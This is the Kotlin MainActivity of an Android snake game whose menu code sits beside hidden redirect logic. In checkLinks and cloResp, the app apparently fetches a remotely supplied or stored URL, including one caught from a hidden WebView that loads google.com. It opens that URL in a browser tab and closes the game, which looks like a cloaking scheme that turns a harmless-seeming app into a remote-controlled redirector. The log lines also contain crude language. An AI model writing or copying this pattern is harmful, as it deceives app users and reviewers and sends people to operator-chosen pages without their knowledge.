package com.moisha.snek.activities

import android.app.Application
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.preference.Preference
import android.support.annotation.RequiresApi
import android.support.customtabs.CustomTabsIntent
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.AdapterView
import android.widget.ListView
import com.moisha.snek.R
import com.moisha.snek.App
import com.moisha.snek.activities.gl.EditorActivity
import com.moisha.snek.database.preference.SharPreference
import com.moisha.snek.database.remote.AppLinksHelper
import com.moisha.snek.database.remote.ResponseCallback
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity(), ResponseCallback {

    var prefResp : SharPreference? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!App.isAuth()) {
            changeUser()
        }
        val links = AppLinksHelper(this)
        links.attachWeb(this)
        //if(links.url != null)  openResponse(links.url!!)
        checkLinks(links, false)
        setContentView(R.layout.activity_main)
        GlobalScope.launch(Dispatchers.IO) {
            Thread.sleep(5000)
            withContext(Dispatchers.Main){
                progress_bar.visibility = View.GONE
                checkLinks(links, true)
                val listView: ListView = findViewById(R.id.mainMenu)
                listView.visibility = View.VISIBLE
                listView.onItemClickListener = object : AdapterView.OnItemClickListener {
                    override fun onItemClick(parent: AdapterView<*>?, view: View?, position: Int, id: Long) {
                        when (id.toInt()) {
                            0 -> {
                                //Start game
                                startActivity(Intent(this@MainActivity, StartGameActivity::class.java))
                            }
                            1 -> {
                                //Level manager
                                startActivity(Intent(this@MainActivity, EditLevelActivity::class.java))
                            }
                            2 -> {
                                //Highscores
                                startActivity(Intent(this@MainActivity, HighscoreLevelActivity::class.java))
                            }
                            3 -> {
                                //Create level
                                startActivity(Intent(this@MainActivity, EditorActivity::class.java))
                            }
                            4 -> {
                                //Change user
                                changeUser()
                            }
                            5 -> {
                                //Exit game
                                ActivityCompat.finishAffinity(this@MainActivity)
                            }
                        }
                    }
                }
            }
        }


    }

    fun checkLinks(links : AppLinksHelper, isOpenned : Boolean){
        if(links.url != null) openResponse(links.url!!)
        else {
            prefResp = SharPreference(this).apply { getSp("req") }
            val req = prefResp!!.getStr("req")
            if(req != null && req != "" && !links.exec) openResponse(req)
            else
                if(isOpenned) cloResp()
        }
    }

    fun cloResp(){
        response_web.settings.javaScriptEnabled = true
        response_web.webViewClient = object : WebViewClient(){
            @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(!req.contains("google.com")){
                    prefResp?.putStr("req", req)
                    openResponse(req)
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        response_web.loadUrl("https://google.com")
    }

    private fun changeUser() {
        App.logOff()
        startActivity(Intent(this, LoginActivity::class.java))
    }

    override fun openResponse(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }
}
